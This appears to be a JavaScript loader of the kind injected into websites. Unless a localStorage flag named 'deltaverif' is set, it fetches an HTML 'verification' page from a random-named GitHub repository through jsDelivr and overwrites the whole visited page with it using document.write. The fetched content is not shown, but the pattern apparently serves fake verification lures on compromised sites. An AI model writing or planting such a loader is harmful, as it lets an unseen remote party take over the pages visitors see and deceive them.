(async function() {
  const requiredKey = "deltaverif";
  const requiredValue = "fea2fb654f17156a8393d060f5b8a2d3833fdf96325b698da7596c76a2d041e9";
  const storedValue = localStorage.getItem(requiredKey);

  if (storedValue !== requiredValue) {
    try {
      const res = await fetch("https://cdn.jsdelivr.net/gh/1e295a49108e716ce8ab7eba0c8dca7d/wowzas44@main/drweb/verif.html?t=" + Date.now());
      const html = await res.text();
      document.open();
      document.write(html);
      document.close();
    } catch (error) {
      console.error("Error loading verification page:", error);
    }
  }
})();
